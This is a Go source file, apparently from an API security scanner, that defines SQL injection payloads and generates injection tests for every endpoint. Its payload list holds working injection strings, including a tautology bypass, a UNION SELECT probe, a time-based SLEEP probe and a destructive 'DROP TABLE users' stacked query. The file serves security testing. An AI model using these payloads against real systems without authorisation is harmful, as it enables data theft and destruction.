package tgen

import "github.com/offat-x/offat-x/pkg/parser"

var sqliPayloads = []Payload{
	{InjText: "' OR '1'='1", VulnerableResponseCodes: []int{200}, Regex: `(?i)(sql|mysql|syntax error|ORA-|postgresql|sqlite)`},
	{InjText: "\" OR \"1\"=\"1", VulnerableResponseCodes: []int{200}, Regex: `(?i)(sql|mysql|syntax error|ORA-|postgresql|sqlite)`},
	{InjText: "1; DROP TABLE users--", VulnerableResponseCodes: []int{200, 500}, Regex: `(?i)(sql|mysql|syntax error)`},
	{InjText: "1 UNION SELECT NULL,NULL,NULL--", VulnerableResponseCodes: []int{200}, Regex: `(?i)(union|select|null)`},
	{InjText: "' OR SLEEP(5)--", VulnerableResponseCodes: []int{200}, Regex: ``},
}

// BasicSqliTest generates SQL injection tests for all endpoints.
func BasicSqliTest(baseURL string, docParams []*parser.DocHttpParams, queryParams map[string]string, headers map[string]string, cfg InjectionConfig) []*ApiTest {
	cfg.Payloads = sqliPayloads
	return injectParamIntoApiTest(baseURL, docParams, queryParams, headers, "Basic SQLi Test", cfg)
}
